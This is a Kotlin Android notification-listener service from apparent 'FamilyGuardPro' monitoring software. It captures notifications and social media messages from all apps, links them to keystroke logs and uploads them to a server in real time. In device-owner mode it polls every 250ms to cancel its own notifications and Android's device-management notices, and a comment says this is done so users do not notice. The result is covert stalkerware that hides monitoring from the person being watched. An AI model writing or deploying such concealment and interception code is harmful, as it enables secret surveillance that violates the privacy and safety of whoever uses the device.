package com.familyguardpro.services

import android.app.Notification
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.models.NotificationData
import com.familyguardpro.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class NotificationListener : NotificationListenerService() {
    
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var keywordAlertService: KeywordAlertService? = null
    private var socialMediaExtractor: SocialMediaChatExtractor? = null
    private var isDeviceOwnerMode: Boolean = false
    
    companion object {
        private const val TAG = "NotificationListener"
        
        // Apps to skip for normal capture
        private val SKIP_PACKAGES = setOf(
            "com.android.systemui",
            "android",
            "com.familyguardpro"
        )
        
        // Packages that post device management notifications
        private val DEVICE_MANAGEMENT_PACKAGES = setOf(
            "android",
            "com.android.settings",
            "com.android.systemui",
            "com.google.android.gms",
            "com.android.managedprovisioning"
        )
        
        // Keywords that indicate device management notifications
        private val DEVICE_MANAGEMENT_KEYWORDS = listOf(
            "device",
            "management",
            "organisation",
            "organization",
            "admin",
            "work",
            "managed",
            "policy",
            "enterprise",
            "mdm",
            "device owner"
        )
    }
    
    private val handler = android.os.Handler(android.os.Looper.getMainLooper())
    private val periodicCancelRunnable = object : Runnable {
        override fun run() {
            if (isDeviceOwnerMode) {
                cancelOwnNotifications()
            }
            // Run every 250ms - fast enough to catch notifications before users notice,
            // but much more battery-friendly than 50ms (5x less CPU wakeups)
            handler.postDelayed(this, 250)
        }
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "NotificationListener connected")
        keywordAlertService = KeywordAlertService(applicationContext)
        socialMediaExtractor = SocialMediaChatExtractor(applicationContext)
        
        // Check Device Owner mode once
        isDeviceOwnerMode = try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(applicationContext)
            doManager.isDeviceOwner()
        } catch (e: Exception) {
            false
        }
        
        // In Device Owner mode, immediately cancel any existing FamilyGuard notifications
        if (isDeviceOwnerMode) {
            cancelOwnNotifications()
            // Start periodic cancellation
            handler.postDelayed(periodicCancelRunnable, 250)
        }
    }
    
    // onListenerDisconnected is defined at the end of the class
    
    /**
     * Cancel all FamilyGuard notifications that may have been posted before we connected
     * Also cancel any device management notifications from Android system
     */
    private fun cancelOwnNotifications() {
        try {
            val activeNotifications = activeNotifications ?: return
            for (sbn in activeNotifications) {
                // Cancel our own notifications IMMEDIATELY
                if (sbn.packageName == "com.familyguardpro") {
                    try {
                        cancelNotification(sbn.key)
                    } catch (e: Exception) {}
                }
                
                // Cancel device management notifications
                if (isDeviceManagementNotification(sbn)) {
                    try {
                        cancelNotification(sbn.key)
                    } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not cancel own notifications: ${e.message}")
        }
    }
    
    /**
     * Check if a notification is a device management notification
     */
    private fun isDeviceManagementNotification(sbn: StatusBarNotification): Boolean {
        // Check if from a system package that posts device management notifs
        if (!DEVICE_MANAGEMENT_PACKAGES.contains(sbn.packageName)) {
            return false
        }
        
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            // Get notification text content
            val title = extras.getString(android.app.Notification.EXTRA_TITLE)?.lowercase() ?: ""
            val text = extras.getString(android.app.Notification.EXTRA_TEXT)?.lowercase() ?: ""
            val bigText = extras.getString(android.app.Notification.EXTRA_BIG_TEXT)?.lowercase() ?: ""
            val subText = extras.getString(android.app.Notification.EXTRA_SUB_TEXT)?.lowercase() ?: ""
            
            // Check for device management keywords
            val allText = "$title $text $bigText $subText"
            for (keyword in DEVICE_MANAGEMENT_KEYWORDS) {
                if (allText.contains(keyword)) {
                    return true
                }
            }
            
            // Also check channel ID if available
            val channelId = notification.channelId?.lowercase() ?: ""
            for (keyword in DEVICE_MANAGEMENT_KEYWORDS) {
                if (channelId.contains(keyword)) {
                    return true
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking notification: ${e.message}")
        }
        
        return false
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let { notification ->
            Log.d(TAG, "📩 Notification from: ${notification.packageName}")
            
            // In Device Owner mode, auto-cancel our own notifications immediately
            if (isDeviceOwnerMode && notification.packageName == "com.familyguardpro") {
                Log.d(TAG, "🚫 Auto-cancelling FamilyGuard notification ${notification.id} in DO mode")
                try {
                    cancelNotification(notification.key)
                } catch (e: Exception) {
                    Log.w(TAG, "Could not cancel notification: ${e.message}")
                }
                return
            }
            
            // In Device Owner mode, auto-cancel device management notifications
            if (isDeviceOwnerMode && isDeviceManagementNotification(notification)) {
                Log.d(TAG, "🚫 Auto-cancelling device management notification from ${notification.packageName}")
                try {
                    cancelNotification(notification.key)
                } catch (e: Exception) {
                    Log.w(TAG, "Could not cancel device management notification: ${e.message}")
                }
                return
            }
            
            // ALWAYS capture social media notifications (like deleted message recovery apps)
            if (SocialMediaChatExtractor.isSocialMediaApp(notification.packageName)) {
                Log.d(TAG, "🔵 Social media notification detected: ${notification.packageName}")
                extractSocialMediaMessage(notification)
            }
            
            // Only capture regular notifications if child mode is active
            if (shouldCapture(notification)) {
                captureNotification(notification)
            }
        }
    }
    
    /**
     * Extract and sync social media chat messages
     * Uses SmartKeystrokeCorrelator for deduplication of sent messages
     */
    private fun extractSocialMediaMessage(sbn: StatusBarNotification) {
        try {
            Log.d(TAG, "🔍 Extracting social media from: ${sbn.packageName}")
            val message = socialMediaExtractor?.parseNotification(sbn)
            if (message != null) {
                Log.d(TAG, "💬 Social message: ${message.appName} | ${message.contactName} | ${message.messageText.take(50)}")
                
                // Check if this correlates with a keystroke session (sent message)
                val correlator = SmartKeystrokeCorrelator.instance
                if (correlator != null) {
                    val isCorrelated = correlator.correlateWithNotification(
                        appPackage = message.appPackage,
                        contactName = message.contactName,
                        messageText = message.messageText,
                        timestamp = message.timestamp
                    )
                    
                    if (isCorrelated) {
                        Log.d(TAG, "🔗 Message correlated - already captured via keystrokes (skipping duplicate)")
                        return // Don't save duplicate - keystroke version already saved
                    }
                }
                
                // This is a RECEIVED message - save it
                socialMediaExtractor?.saveAndSyncMessage(message)
            } else {
                Log.d(TAG, "⚠️ parseNotification returned null for ${sbn.packageName}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error extracting social media message", e)
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional: Track when notifications are removed
    }
    
    private fun shouldCapture(sbn: StatusBarNotification): Boolean {
        // Skip system and own notifications
        if (SKIP_PACKAGES.contains(sbn.packageName)) {
            return false
        }
        
        // Only capture if child mode is active
        val app = applicationContext as? FamilyGuardApp
        val prefs = app?.preferenceManager
        
        if (prefs?.isChildMode() != true) {
            return false
        }
        
        // Check if notification capture is enabled
        if (prefs.isNotificationCaptureEnabled() != true) {
            return false
        }
        
        return true
    }
    
    private fun captureNotification(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()
            val content = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
            
            // Get app name
            val pm = packageManager
            val appName = try {
                val appInfo = pm.getApplicationInfo(sbn.packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (e: PackageManager.NameNotFoundException) {
                sbn.packageName
            }
            
            // Get device ID
            val app = applicationContext as? FamilyGuardApp
            val deviceId = app?.preferenceManager?.getDeviceId() ?: return
            
            val notificationData = NotificationData(
                id = sbn.id.toString(),
                deviceId = deviceId,
                packageName = sbn.packageName,
                appName = appName,
                title = title,
                text = content ?: bigText,
                timestamp = sbn.postTime
            )
            
            Log.d(TAG, "Captured notification from $appName: $title")
            
            // Scan for suspicious keywords
            keywordAlertService?.scanNotification(
                title = title,
                text = content ?: bigText,
                packageName = sbn.packageName
            )
            
            // Upload to server
            uploadNotification(notificationData)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing notification", e)
        }
    }
    
    private fun uploadNotification(notification: NotificationData) {
        // Send via WebSocket for REAL-TIME delivery (instant, 0 delay)
        WebSocketSyncService.sendNotification(notification)
        
        // Also upload via REST API for persistence/backup
        scope.launch {
            try {
                val result = ApiClient.uploadNotification(notification)
                result.fold(
                    onSuccess = {
                        Log.d(TAG, "Notification uploaded successfully")
                    },
                    onFailure = { error ->
                        Log.e(TAG, "Failed to upload notification: ${error.message}")
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading notification", e)
            }
        }
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "NotificationListener disconnected")
        handler.removeCallbacks(periodicCancelRunnable)
        keywordAlertService = null
        socialMediaExtractor?.destroy()
        socialMediaExtractor = null
    }
}
